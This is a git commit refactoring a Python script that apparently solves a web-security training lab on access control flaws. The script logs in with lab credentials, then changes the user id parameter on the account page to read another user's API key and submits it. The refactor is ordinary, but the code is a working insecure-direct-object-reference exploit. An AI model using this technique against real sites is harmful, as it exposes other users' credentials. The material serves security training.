57cf9adbe539034e054176ca4aa2906812344fd8
Fionn Fitzmaurice <fionn@github.com>
2020-01-31 21:33:05 +0800

    Decompose get_api_key

--- access_control_vulnerabilities/lab_07.py
+++ access_control_vulnerabilities/lab_07.py
@@ -8,15 +8,21 @@ import lab_04
 class Lab(lab_04.Lab):
     """Wrapper"""
 
-    def get_api_key(self, user_id: str) -> str:
-        """Get a given user's API key"""
-        response = self.get(self.url + "/my-account", params={"id": user_id})
+    def get_api_key_from_response(self,
+                                  response: requests.models.Response) -> str:
+        """Parse response for API key"""
         api_key = None
         for line in response.text.splitlines():
             if "Your API Key is: " in line:
                 api_key = line.split("Your API Key is: ")[1].split("<")[0]
                 return api_key
         raise ValueError("Cannot find API key")
+
+
+    def get_api_key_from_user_id(self, user_id: str) -> str:
+        """Get a given user's API key"""
+        response = self.get(self.url + "/my-account", params={"id": user_id})
+        return self.get_api_key_from_response(response)
 
     def submit_solution(self, answer: str) -> requests.models.Response:
         """Submit solution"""
@@ -30,7 +36,7 @@ def main() -> None:
     site = Lab()
     csrf = site.csrf_token("/login")
     site.login(username="wiener", password="peter", csrf=csrf)
-    api_key = site.get_api_key("carlos")
+    api_key = site.get_api_key_from_user_id("carlos")
     response = site.submit_solution(api_key)
     print(response.status_code)
 
